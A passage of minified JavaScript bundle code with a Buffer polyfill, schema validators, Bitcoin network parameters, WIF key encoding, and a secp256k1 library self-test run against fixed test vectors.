    }), m.prototype.readBigInt64BE = Ue(function(o) {
      o = o >>> 0, an(o, "offset");
      const s = this[o], g = this[o + 7];
      (s === void 0 || g === void 0) && Sl(o, this.length - 8);
      const S = (s << 24) + this[++o] * 2 ** 16 + this[++o] * 2 ** 8 + this[++o];
      return (BigInt(S) << BigInt(32)) + BigInt(this[++o] * 2 ** 24 + this[++o] * 2 ** 16 + this[++o] * 2 ** 8 + g);
    }), m.prototype.readFloatLE = function(o, s) {
      return o = o >>> 0, s || j(o, 4, this.length), r.read(this, o, true, 23, 4);
    }, m.prototype.readFloatBE = function(o, s) {
      return o = o >>> 0, s || j(o, 4, this.length), r.read(this, o, false, 23, 4);
    }, m.prototype.readDoubleLE = function(o, s) {
      return o = o >>> 0, s || j(o, 8, this.length), r.read(this, o, true, 52, 8);
    }, m.prototype.readDoubleBE = function(o, s) {
      return o = o >>> 0, s || j(o, 8, this.length), r.read(this, o, false, 52, 8);
    };
    function J(y, o, s, g, S, z) {
      if (!m.isBuffer(y)) throw new TypeError('"buffer" argument must be a Buffer instance');
      if (o > S || o < z) throw new RangeError('"value" argument is out of bounds');
      if (s + g > y.length) throw new RangeError("Index out of range");
    }
    m.prototype.writeUintLE = m.prototype.writeUIntLE = function(o, s, g, S) {
      if (o = +o, s = s >>> 0, g = g >>> 0, !S) {
        const rt = Math.pow(2, 8 * g) - 1;
        J(this, o, s, g, rt, 0);
      }
      let z = 1, C = 0;
      for (this[s] = o & 255; ++C < g && (z *= 256); ) this[s + C] = o / z & 255;
      return s + g;
    }, m.prototype.writeUintBE = m.prototype.writeUIntBE = function(o, s, g, S) {
      if (o = +o, s = s >>> 0, g = g >>> 0, !S) {
        const rt = Math.pow(2, 8 * g) - 1;
        J(this, o, s, g, rt, 0);
      }
      let z = g - 1, C = 1;
      for (this[s + z] = o & 255; --z >= 0 && (C *= 256); ) this[s + z] = o / C & 255;
      return s + g;
    }, m.prototype.writeUint8 = m.prototype.writeUInt8 = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 1, 255, 0), this[s] = o & 255, s + 1;
    }, m.prototype.writeUint16LE = m.prototype.writeUInt16LE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 2, 65535, 0), this[s] = o & 255, this[s + 1] = o >>> 8, s + 2;
    }, m.prototype.writeUint16BE = m.prototype.writeUInt16BE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 2, 65535, 0), this[s] = o >>> 8, this[s + 1] = o & 255, s + 2;
    }, m.prototype.writeUint32LE = m.prototype.writeUInt32LE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 4, 4294967295, 0), this[s + 3] = o >>> 24, this[s + 2] = o >>> 16, this[s + 1] = o >>> 8, this[s] = o & 255, s + 4;
    }, m.prototype.writeUint32BE = m.prototype.writeUInt32BE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 4, 4294967295, 0), this[s] = o >>> 24, this[s + 1] = o >>> 16, this[s + 2] = o >>> 8, this[s + 3] = o & 255, s + 4;
    };
    function ct(y, o, s, g, S) {
      $l(o, g, S, y, s, 7);
      let z = Number(o & BigInt(4294967295));
      y[s++] = z, z = z >> 8, y[s++] = z, z = z >> 8, y[s++] = z, z = z >> 8, y[s++] = z;
      let C = Number(o >> BigInt(32) & BigInt(4294967295));
      return y[s++] = C, C = C >> 8, y[s++] = C, C = C >> 8, y[s++] = C, C = C >> 8, y[s++] = C, s;
    }
    function pt(y, o, s, g, S) {
      $l(o, g, S, y, s, 7);
      let z = Number(o & BigInt(4294967295));
      y[s + 7] = z, z = z >> 8, y[s + 6] = z, z = z >> 8, y[s + 5] = z, z = z >> 8, y[s + 4] = z;
      let C = Number(o >> BigInt(32) & BigInt(4294967295));
      return y[s + 3] = C, C = C >> 8, y[s + 2] = C, C = C >> 8, y[s + 1] = C, C = C >> 8, y[s] = C, s + 8;
    }
    m.prototype.writeBigUInt64LE = Ue(function(o, s = 0) {
      return ct(this, o, s, BigInt(0), BigInt("0xffffffffffffffff"));
    }), m.prototype.writeBigUInt64BE = Ue(function(o, s = 0) {
      return pt(this, o, s, BigInt(0), BigInt("0xffffffffffffffff"));
    }), m.prototype.writeIntLE = function(o, s, g, S) {
      if (o = +o, s = s >>> 0, !S) {
        const qt = Math.pow(2, 8 * g - 1);
        J(this, o, s, g, qt - 1, -qt);
      }
      let z = 0, C = 1, rt = 0;
      for (this[s] = o & 255; ++z < g && (C *= 256); ) o < 0 && rt === 0 && this[s + z - 1] !== 0 && (rt = 1), this[s + z] = (o / C >> 0) - rt & 255;
      return s + g;
    }, m.prototype.writeIntBE = function(o, s, g, S) {
      if (o = +o, s = s >>> 0, !S) {
        const qt = Math.pow(2, 8 * g - 1);
        J(this, o, s, g, qt - 1, -qt);
      }
      let z = g - 1, C = 1, rt = 0;
      for (this[s + z] = o & 255; --z >= 0 && (C *= 256); ) o < 0 && rt === 0 && this[s + z + 1] !== 0 && (rt = 1), this[s + z] = (o / C >> 0) - rt & 255;
      return s + g;
    }, m.prototype.writeInt8 = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 1, 127, -128), o < 0 && (o = 255 + o + 1), this[s] = o & 255, s + 1;
    }, m.prototype.writeInt16LE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 2, 32767, -32768), this[s] = o & 255, this[s + 1] = o >>> 8, s + 2;
    }, m.prototype.writeInt16BE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 2, 32767, -32768), this[s] = o >>> 8, this[s + 1] = o & 255, s + 2;
    }, m.prototype.writeInt32LE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 4, 2147483647, -2147483648), this[s] = o & 255, this[s + 1] = o >>> 8, this[s + 2] = o >>> 16, this[s + 3] = o >>> 24, s + 4;
    }, m.prototype.writeInt32BE = function(o, s, g) {
      return o = +o, s = s >>> 0, g || J(this, o, s, 4, 2147483647, -2147483648), o < 0 && (o = 4294967295 + o + 1), this[s] = o >>> 24, this[s + 1] = o >>> 16, this[s + 2] = o >>> 8, this[s + 3] = o & 255, s + 4;
    }, m.prototype.writeBigInt64LE = Ue(function(o, s = 0) {
      return ct(this, o, s, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"));
    }), m.prototype.writeBigInt64BE = Ue(function(o, s = 0) {
      return pt(this, o, s, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"));
    });
    function ee(y, o, s, g, S, z) {
      if (s + g > y.length) throw new RangeError("Index out of range");
      if (s < 0) throw new RangeError("Index out of range");
    }
    function Gt(y, o, s, g, S) {
      return o = +o, s = s >>> 0, S || ee(y, o, s, 4), r.write(y, o, s, g, 23, 4), s + 4;
    }
    m.prototype.writeFloatLE = function(o, s, g) {
      return Gt(this, o, s, true, g);
    }, m.prototype.writeFloatBE = function(o, s, g) {
      return Gt(this, o, s, false, g);
    };
    function Kn(y, o, s, g, S) {
      return o = +o, s = s >>> 0, S || ee(y, o, s, 8), r.write(y, o, s, g, 52, 8), s + 8;
    }
    m.prototype.writeDoubleLE = function(o, s, g) {
      return Kn(this, o, s, true, g);
    }, m.prototype.writeDoubleBE = function(o, s, g) {
      return Kn(this, o, s, false, g);
    }, m.prototype.copy = function(o, s, g, S) {
      if (!m.isBuffer(o)) throw new TypeError("argument should be a Buffer");
      if (g || (g = 0), !S && S !== 0 && (S = this.length), s >= o.length && (s = o.length), s || (s = 0), S > 0 && S < g && (S = g), S === g || o.length === 0 || this.length === 0) return 0;
      if (s < 0) throw new RangeError("targetStart out of bounds");
      if (g < 0 || g >= this.length) throw new RangeError("Index out of range");
      if (S < 0) throw new RangeError("sourceEnd out of bounds");
      S > this.length && (S = this.length), o.length - s < S - g && (S = o.length - s + g);
      const z = S - g;
      return this === o && typeof b.prototype.copyWithin == "function" ? this.copyWithin(s, g, S) : b.prototype.set.call(o, this.subarray(g, S), s), z;
    }, m.prototype.fill = function(o, s, g, S) {
      if (typeof o == "string") {
        if (typeof s == "string" ? (S = s, s = 0, g = this.length) : typeof g == "string" && (S = g, g = this.length), S !== void 0 && typeof S != "string") throw new TypeError("encoding must be a string");
        if (typeof S == "string" && !m.isEncoding(S)) throw new TypeError("Unknown encoding: " + S);
        if (o.length === 1) {
          const C = o.charCodeAt(0);
          (S === "utf8" && C < 128 || S === "latin1") && (o = C);
        }
      } else typeof o == "number" ? o = o & 255 : typeof o == "boolean" && (o = Number(o));
      if (s < 0 || this.length < s || this.length < g) throw new RangeError("Out of range index");
      if (g <= s) return this;
      s = s >>> 0, g = g === void 0 ? this.length : g >>> 0, o || (o = 0);
      let z;
      if (typeof o == "number") for (z = s; z < g; ++z) this[z] = o;
      else {
        const C = m.isBuffer(o) ? o : m.from(o, S), rt = C.length;
        if (rt === 0) throw new TypeError('The value "' + o + '" is invalid for argument "value"');
        for (z = 0; z < g - s; ++z) this[z + s] = C[z % rt];
      }
      return this;
    };
    const tn = {};
    function Tl(y, o, s) {
      tn[y] = class extends s {
        constructor() {
          super(), Object.defineProperty(this, "message", {
            value: o.apply(this, arguments),
            writable: true,
            configurable: true
          }), this.name = `${this.name} [${y}]`, this.stack, delete this.name;
        }
        get code() {
          return y;
        }
        set code(S) {
          Object.defineProperty(this, "code", {
            configurable: true,
            enumerable: true,
            value: S,
            writable: true
          });
        }
        toString() {
          return `${this.name} [${y}]: ${this.message}`;
        }
      };
    }
    Tl("ERR_BUFFER_OUT_OF_BOUNDS", function(y) {
      return y ? `${y} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds";
    }, RangeError), Tl("ERR_INVALID_ARG_TYPE", function(y, o) {
      return `The "${y}" argument must be of type number. Received type ${typeof o}`;
    }, TypeError), Tl("ERR_OUT_OF_RANGE", function(y, o, s) {
      let g = `The value of "${y}" is out of range.`, S = s;
      return Number.isInteger(s) && Math.abs(s) > 2 ** 32 ? S = Vu(String(s)) : typeof s == "bigint" && (S = String(s), (s > BigInt(2) ** BigInt(32) || s < -(BigInt(2) ** BigInt(32))) && (S = Vu(S)), S += "n"), g += ` It must be ${o}. Received ${S}`, g;
    }, RangeError);
    function Vu(y) {
      let o = "", s = y.length;
      const g = y[0] === "-" ? 1 : 0;
      for (; s >= g + 4; s -= 3) o = `_${y.slice(s - 3, s)}${o}`;
      return `${y.slice(0, s)}${o}`;
    }
    function En(y, o, s) {
      an(o, "offset"), (y[o] === void 0 || y[o + s] === void 0) && Sl(o, y.length - (s + 1));
    }
    function $l(y, o, s, g, S, z) {
      if (y > s || y < o) {
        const C = typeof o == "bigint" ? "n" : "";
        let rt;
        throw o === 0 || o === BigInt(0) ? rt = `>= 0${C} and < 2${C} ** ${(z + 1) * 8}${C}` : rt = `>= -(2${C} ** ${(z + 1) * 8 - 1}${C}) and < 2 ** ${(z + 1) * 8 - 1}${C}`, new tn.ERR_OUT_OF_RANGE("value", rt, y);
      }
      En(g, S, z);
    }
    function an(y, o) {
      if (typeof y != "number") throw new tn.ERR_INVALID_ARG_TYPE(o, "number", y);
    }
    function Sl(y, o, s) {
      throw Math.floor(y) !== y ? (an(y, s), new tn.ERR_OUT_OF_RANGE("offset", "an integer", y)) : o < 0 ? new tn.ERR_BUFFER_OUT_OF_BOUNDS() : new tn.ERR_OUT_OF_RANGE("offset", `>= 0 and <= ${o}`, y);
    }
    const ka = /[^+/0-9A-Za-z-_]/g;
    function Zu(y) {
      if (y = y.split("=")[0], y = y.trim().replace(ka, ""), y.length < 2) return "";
      for (; y.length % 4 !== 0; ) y = y + "=";
      return y;
    }
    function Ul(y, o) {
      o = o || 1 / 0;
      let s;
      const g = y.length;
      let S = null;
      const z = [];
      for (let C = 0; C < g; ++C) {
        if (s = y.charCodeAt(C), s > 55295 && s < 57344) {
          if (!S) {
            if (s > 56319) {
              (o -= 3) > -1 && z.push(239, 191, 189);
              continue;
            } else if (C + 1 === g) {
              (o -= 3) > -1 && z.push(239, 191, 189);
              continue;
            }
            S = s;
            continue;
          }
          if (s < 56320) {
            (o -= 3) > -1 && z.push(239, 191, 189), S = s;
            continue;
          }
          s = (S - 55296 << 10 | s - 56320) + 65536;
        } else S && (o -= 3) > -1 && z.push(239, 191, 189);
        if (S = null, s < 128) {
          if ((o -= 1) < 0) break;
          z.push(s);
        } else if (s < 2048) {
          if ((o -= 2) < 0) break;
          z.push(s >> 6 | 192, s & 63 | 128);
        } else if (s < 65536) {
          if ((o -= 3) < 0) break;
          z.push(s >> 12 | 224, s >> 6 & 63 | 128, s & 63 | 128);
        } else if (s < 1114112) {
          if ((o -= 4) < 0) break;
          z.push(s >> 18 | 240, s >> 12 & 63 | 128, s >> 6 & 63 | 128, s & 63 | 128);
        } else throw new Error("Invalid code point");
      }
      return z;
    }
    function Iu(y) {
      const o = [];
      for (let s = 0; s < y.length; ++s) o.push(y.charCodeAt(s) & 255);
      return o;
    }
    function Rf(y, o) {
      let s, g, S;
      const z = [];
      for (let C = 0; C < y.length && !((o -= 2) < 0); ++C) s = y.charCodeAt(C), g = s >> 8, S = s % 256, z.push(S), z.push(g);
      return z;
    }
    function $a(y) {
      return f.toByteArray(Zu(y));
    }
    function ne(y, o, s, g) {
      let S;
      for (S = 0; S < g && !(S + s >= o.length || S >= y.length); ++S) o[S + s] = y[S];
      return S;
    }
    function we(y, o) {
      return y instanceof o || y != null && y.constructor != null && y.constructor.name != null && y.constructor.name === o.name;
    }
    function Pl(y) {
      return y !== y;
    }
    const Pa = (function() {
      const y = "0123456789abcdef", o = new Array(256);
      for (let s = 0; s < 16; ++s) {
        const g = s * 16;
        for (let S = 0; S < 16; ++S) o[g + S] = y[s] + y[S];
      }
      return o;
    })();
    function Ue(y) {
      return typeof BigInt > "u" ? Df : y;
    }
    function Df() {
      throw new Error("BigInt not supported");
    }
  })(g0);
  const ae = g0.Buffer, pl = g0.Buffer, Qh = {
    messagePrefix: `Bitcoin Signed Message:
`,
    bech32: "bc",
    bip32: {
      public: 76067358,
      private: 76066276
    },
    pubKeyHash: 0,
    scriptHash: 5,
    wif: 128
  };
  var e0;
  function c8(u) {
    return {
      lang: (u == null ? void 0 : u.lang) ?? (e0 == null ? void 0 : e0.lang),
      message: u == null ? void 0 : u.message,
      abortEarly: (u == null ? void 0 : u.abortEarly) ?? (e0 == null ? void 0 : e0.abortEarly),
      abortPipeEarly: (u == null ? void 0 : u.abortPipeEarly) ?? (e0 == null ? void 0 : e0.abortPipeEarly)
    };
  }
  var r8;
  function o8(u) {
    return r8 == null ? void 0 : r8.get(u);
  }
  var s8;
  function h8(u) {
    return s8 == null ? void 0 : s8.get(u);
  }
  var d8;
  function y8(u, f) {
    var _a;
    return (_a = d8 == null ? void 0 : d8.get(u)) == null ? void 0 : _a.get(f);
  }
  function Ka(u) {
    var _a, _b;
    const f = typeof u;
    return f === "string" ? `"${u}"` : f === "number" || f === "bigint" || f === "boolean" ? `${u}` : f === "object" || f === "function" ? (u && ((_b = (_a = Object.getPrototypeOf(u)) == null ? void 0 : _a.constructor) == null ? void 0 : _b.name)) ?? "null" : f;
  }
  function un(u, f, r, c, E) {
    const b = E && "input" in E ? E.input : r.value, p = (E == null ? void 0 : E.expected) ?? u.expects ?? null, x = (E == null ? void 0 : E.received) ?? Ka(b), A = {
      kind: u.kind,
      type: u.type,
      input: b,
      expected: p,
      received: x,
      message: `Invalid ${f}: ${p ? `Expected ${p} but r` : "R"}eceived ${x}`,
      requirement: u.requirement,
      path: E == null ? void 0 : E.path,
      issues: E == null ? void 0 : E.issues,
      lang: c.lang,
      abortEarly: c.abortEarly,
      abortPipeEarly: c.abortPipeEarly
    }, v = u.kind === "schema", m = (E == null ? void 0 : E.message) ?? u.message ?? y8(u.reference, A.lang) ?? (v ? h8(A.lang) : null) ?? c.message ?? o8(A.lang);
    m && (A.message = typeof m == "function" ? m(A) : m), v && (r.typed = false), r.issues ? r.issues.push(A) : r.issues = [
      A
    ];
  }
  var m8 = class extends Error {
    constructor(u) {
      super(u[0].message);
      __publicField(this, "issues");
      this.name = "ValiError", this.issues = u;
    }
  };
  function p0(u) {
    return {
      kind: "validation",
      type: "integer",
      reference: p0,
      async: false,
      expects: null,
      requirement: Number.isInteger,
      message: u,
      _run(f, r) {
        return f.typed && !this.requirement(f.value) && un(this, "integer", f, r), f;
      }
    };
  }
  function Xd(u, f) {
    return {
      kind: "validation",
      type: "length",
      reference: Xd,
      async: false,
      expects: `${u}`,
      requirement: u,
      message: f,
      _run(r, c) {
        return r.typed && r.value.length !== this.requirement && un(this, "length", r, c, {
          received: `${r.value.length}`
        }), r;
      }
    };
  }
  function E0(u, f) {
    return {
      kind: "validation",
      type: "max_value",
      reference: E0,
      async: false,
      expects: `<=${u instanceof Date ? u.toJSON() : Ka(u)}`,
      requirement: u,
      message: f,
      _run(r, c) {
        return r.typed && r.value > this.requirement && un(this, "value", r, c, {
          received: r.value instanceof Date ? r.value.toJSON() : Ka(r.value)
        }), r;
      }
    };
  }
  function b0(u, f) {
    return {
      kind: "validation",
      type: "min_value",
      reference: b0,
      async: false,
      expects: `>=${u instanceof Date ? u.toJSON() : Ka(u)}`,
      requirement: u,
      message: f,
      _run(r, c) {
        return r.typed && r.value < this.requirement && un(this, "value", r, c, {
          received: r.value instanceof Date ? r.value.toJSON() : Ka(r.value)
        }), r;
      }
    };
  }
  function Kd(u) {
    return {
      kind: "transformation",
      type: "transform",
      reference: Kd,
      async: false,
      operation: u,
      _run(f) {
        return f.value = this.operation(f.value), f;
      }
    };
  }
  function g8(u, f, r) {
    return typeof u.default == "function" ? u.default(f, r) : u.default;
  }
  function Qd(u) {
    return {
      kind: "schema",
      type: "boolean",
      reference: Qd,
      expects: "boolean",
      async: false,
      message: u,
      _run(f, r) {
        return typeof f.value == "boolean" ? f.typed = true : un(this, "type", f, r), f;
      }
    };
  }
  function Qa(u, f) {
    return {
      kind: "schema",
      type: "instance",
      reference: Qa,
      expects: u.name,
      async: false,
      class: u,
      message: f,
      _run(r, c) {
        return r.value instanceof this.class ? r.typed = true : un(this, "type", r, c), r;
      }
    };
  }
  function xf(u) {
    return {
      kind: "schema",
      type: "number",
      reference: xf,
      expects: "number",
      async: false,
      message: u,
      _run(f, r) {
        return typeof f.value == "number" && !isNaN(f.value) ? f.typed = true : un(this, "type", f, r), f;
      }
    };
  }
  function _f(u, f) {
    return {
      kind: "schema",
      type: "object",
      reference: _f,
      expects: "Object",
      async: false,
      entries: u,
      message: f,
      _run(r, c) {
        var _a;
        const E = r.value;
        if (E && typeof E == "object") {
          r.typed = true, r.value = {};
          for (const b in this.entries) {
            const p = E[b], x = this.entries[b]._run({
              typed: false,
              value: p
            }, c);
            if (x.issues) {
              const A = {
                type: "object",
                origin: "value",
                input: E,
                key: b,
                value: p
              };
              for (const v of x.issues) v.path ? v.path.unshift(A) : v.path = [
                A
              ], (_a = r.issues) == null ? void 0 : _a.push(v);
              if (r.issues || (r.issues = x.issues), c.abortEarly) {
                r.typed = false;
                break;
              }
            }
            x.typed || (r.typed = false), (x.value !== void 0 || b in E) && (r.value[b] = x.value);
          }
        } else un(this, "type", r, c);
        return r;
      }
    };
  }
  function Yu(u, ...f) {
    const r = {
      kind: "schema",
      type: "optional",
      reference: Yu,
      expects: `${u.expects} | undefined`,
      async: false,
      wrapped: u,
      _run(c, E) {
        return c.value === void 0 && ("default" in this && (c.value = g8(this, c, E)), c.value === void 0) ? (c.typed = true, c) : this.wrapped._run(c, E);
      }
    };
    return 0 in f && (r.default = f[0]), r;
  }
  function o0(u) {
    return {
      kind: "schema",
      type: "string",
      reference: o0,
      expects: "string",
      async: false,
      message: u,
      _run(f, r) {
        return typeof f.value == "string" ? f.typed = true : un(this, "type", f, r), f;
      }
    };
  }
  function Vh(u) {
    let f;
    if (u) for (const r of u) f ? f.push(...r.issues) : f = r.issues;
    return f;
  }
  function Vd(u, f) {
    return {
      kind: "schema",
      type: "union",
      reference: Vd,
      expects: [
        ...new Set(u.map((r) => r.expects))
      ].join(" | ") || "never",
      async: false,
      options: u,
      message: f,
      _run(r, c) {
        let E, b, p;
        for (const x of this.options) {
          const A = x._run({
            typed: false,
            value: r.value
          }, c);
          if (A.typed) if (A.issues) b ? b.push(A) : b = [
            A
          ];
          else {
            E = A;
            break;
          }
          else p ? p.push(A) : p = [
            A
          ];
        }
        if (E) return E;
        if (b) {
          if (b.length === 1) return b[0];
          un(this, "type", r, c, {
            issues: Vh(b)
          }), r.typed = true;
        } else {
          if ((p == null ? void 0 : p.length) === 1) return p[0];
          un(this, "type", r, c, {
            issues: Vh(p)
          });
        }
        return r;
      }
    };
  }
  function Zl(u, f, r) {
    const c = u._run({
      typed: false,
      value: f
    }, c8(r));
    if (c.issues) throw new m8(c.issues);
    return c.value;
  }
  function Of(...u) {
    return {
      ...u[0],
      pipe: u,
      _run(f, r) {
        for (const c of u) if (c.kind !== "metadata") {
          if (f.issues && (c.kind === "schema" || c.kind === "transformation")) {
            f.typed = false;
            break;
          }
          (!f.issues || !r.abortEarly && !r.abortPipeEarly) && (f = c._run(f, r));
        }
        return f;
      }
    };
  }
  const Zh = Of(xf(), p0(), b0(0), E0(4294967295)), n0 = Of(xf(), p0(), b0(0), E0(255)), v8 = _f({
    messagePrefix: Vd([
      o0(),
      Qa(Uint8Array)
    ]),
    bech32: o0(),
    bip32: _f({
      public: Zh,
      private: Zh
    }),
    pubKeyHash: n0,
    scriptHash: n0,
    wif: n0
  }), Ih = Of(Qa(Uint8Array), Xd(32));
  function p8(u, f) {
    if (u.length === 33) return {
      version: u[0],
      privateKey: u.slice(1, 33),
      compressed: false
    };
    if (u.length !== 34) throw new Error("Invalid WIF length");
    if (u[33] !== 1) throw new Error("Invalid compression flag");
    return {
      version: u[0],
      privateKey: u.slice(1, 33),
      compressed: true
    };
  }
  function E8(u, f, r) {
    if (f.length !== 32) throw new TypeError("Invalid privateKey length");
    var c = new Uint8Array(r ? 34 : 33), E = new DataView(c.buffer);
    return E.setUint8(0, u), c.set(f, 1), r && (c[33] = 1), c;
  }
  function b8(u, f) {
    return p8(bf.decode(u));
  }
  function _8(u) {
    return bf.encode(E8(u.version, u.privateKey, u.compressed));
  }
  const $ = (u) => ae.from(u, "hex");
  function A8(u) {
    Yt(u.isPoint($("0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"))), Yt(!u.isPoint($("030000000000000000000000000000000000000000000000000000000000000005"))), Yt(u.isPrivate($("79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"))), Yt(u.isPrivate($("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140"))), Yt(!u.isPrivate($("0000000000000000000000000000000000000000000000000000000000000000"))), Yt(!u.isPrivate($("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"))), Yt(!u.isPrivate($("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364142"))), Yt(ae.from(u.privateAdd($("0000000000000000000000000000000000000000000000000000000000000001"), $("0000000000000000000000000000000000000000000000000000000000000000"))).equals($("0000000000000000000000000000000000000000000000000000000000000001"))), Yt(u.privateAdd($("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036413e"), $("0000000000000000000000000000000000000000000000000000000000000003")) === null), Yt(ae.from(u.privateAdd($("e211078564db65c3ce7704f08262b1f38f1ef412ad15b5ac2d76657a63b2c500"), $("b51fbb69051255d1becbd683de5848242a89c229348dd72896a87ada94ae8665"))).equals($("9730c2ee69edbb958d42db7460bafa18fef9d955325aec99044c81c8282b0a24"))), Yt(ae.from(u.privateNegate($("0000000000000000000000000000000000000000000000000000000000000001"))).equals($("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140"))), Yt(ae.from(u.privateNegate($("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036413e"))).equals($("0000000000000000000000000000000000000000000000000000000000000003"))), Yt(ae.from(u.privateNegate($("b1121e4088a66a28f5b6b0f5844943ecd9f610196d7bb83b25214b60452c09af"))).equals($("4eede1bf775995d70a494f0a7bb6bc11e0b8cccd41cce8009ab1132c8b0a3792"))), Yt(ae.from(u.pointCompress($("0479be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"), true)).equals($("0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"))), Yt(ae.from(u.pointCompress($("0479be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"), false)).equals($("0479be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"))), Yt(ae.from(u.pointCompress($("0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"), true)).equals($("0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"))), Yt(ae.from(u.pointCompress($("0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"), false)).equals($("0479be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"))), Yt(ae.from(u.pointFromScalar($("b1121e4088a66a28f5b6b0f5844943ecd9f610196d7bb83b25214b60452c09af"))).equals($("02b07ba9dca9523b7ef4bd97703d43d20399eb698e194704791a25ce77a400df99"))), Yt(u.xOnlyPointAddTweak($("79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"), $("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140")) === null);
    let f = u.xOnlyPointAddTweak($("1617d38ed8d8657da4d4761e8057bc396ea9e4b9d29776d4be096016dbd2509b"), $("a8397a935f0dfceba6ba9618f6451ef4d80637abf4e6af2669fbc9de6a8fd2ac"));
    Yt(ae.from(f.xOnlyPubkey).equals($("e478f99dab91052ab39a33ea35fd5e6e4933f4d28023cd597c9a1f6760346adf")) && f.parity === 1), f = u.xOnlyPointAddTweak($("2c0b7cf95324a07d05398b240174dc0c2be444d96b159aa6c7f7b1e668680991"), $("823c3cd2142744b075a87eade7e1b8678ba308d566226a0056ca2b7a76f86b47")), Yt(ae.from(f.xOnlyPubkey).equals($("9534f8dc8c6deda2dc007655981c78b49c5d96c778fbf363462a11ec9dfd948c")) && f.parity === 0), Yt(ae.from(u.sign($("5e9f0a0d593efdcf78ac923bc3313e4e7d408d574354ee2b3288c0da9fbba6ed"), $("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140"))).equals($("54c4a33c6423d689378f160a7ff8b61330444abb58fb470f96ea16d99d4a2fed07082304410efa6b2943111b6a4e0aaa7b7db55a07e9861d1fb3cb1f421044a5"))), Yt(u.verify($("5e9f0a0d593efdcf78ac923bc3313e4e7d408d574354ee2b3288c0da9fbba6ed"), $("0379be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"), $("54c4a33c6423d689378f160a7ff8b61330444abb58fb470f96ea16d99d4a2fed07082304410efa6b2943111b6a4e0aaa7b7db55a07e9861d1fb3cb1f421044a5"))), u.signSchnorr && Yt(ae.from(u.signSchnorr($("7e2d58d8b3bcdf1abadec7829054f90dda9805aab56c77333024b9d0a508b75c"), $("c90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b14e5c9"), $("c87aa53824b4d7ae2eb035a2b5bbbccc080e76cdc6d1692c4b0b62d798e6d906"))).equals($("5831aaeed7b44bb74e5eab94ba9d4294c49bcf2a60728d8b4c200f50dd313c1bab745879a5ad954a72c45a91c3a51d3c7adea98d82f8481e0e1e03674a6f3fb7"))), u.verifySchnorr && Yt(u.verifySchnorr($("7e2d58d8b3bcdf1abadec7829054f90dda9805aab56c77333024b9d0a508b75c"), $("dd308afec5777e13121fa72b9cc1b7cc0139715309b086c960e18fd969774eb8"), $("5831aaeed7b44bb74e5eab94ba9d4294c49bcf2a60728d8b4c200f50dd313c1bab745879a5ad954a72c45a91c3a51d3c7adea98d82f8481e0e1e03674a6f3fb7")));
  }
  function Yt(u) {
    if (!u) throw new Error("ecc library invalid");
  }
  const Zd = "0123456789abcdefABCDEF";
  Zd.split("").map((u) => u.codePointAt(0));
  Array(256).fill(true).map((u, f) => {
    const r = String.fromCodePoint(f), c = Zd.indexOf(r);
    return c < 0 ? void 0 : c < 16 ? c : c - 6;
  });
  new TextEncoder();
  new TextDecoder();
  function T8(u) {
    const f = u.reduce((E, b) => E + b.length, 0), r = new Uint8Array(f);
    let c = 0;
    for (const E of u) r.set(E, c), c += E.length;
    return r;
  }
  function S8(u, f, r, c) {
    if (f + 4 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (c = c.toUpperCase(), r > 4294967295) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= ${4294967295}. Received ${r}`);
    c === "LE" ? (u[f] = r & 255, u[f + 1] = r >> 8 & 255, u[f + 2] = r >> 16 & 255, u[f + 3] = r >> 24 & 255) : (u[f] = r >> 24 & 255, u[f + 1] = r >> 16 & 255, u[f + 2] = r >> 8 & 255, u[f + 3] = r & 255);
  }
  const l0 = Yu(_f({
    compressed: Yu(Qd()),
    network: Yu(v8),
    rng: Yu(Of(Qa(Function), Kd((u) => (f) => {
      const r = Zl(Yu(xf()), f), c = u(r);
      return Zl(Qa(Uint8Array), c);
    })))
  })), U8 = (u) => u.length === 32 ? u : u.subarray(1, 33);
  function x8(u) {
    A8(u);
    function f(x) {
      return u.isPoint(x);
    }
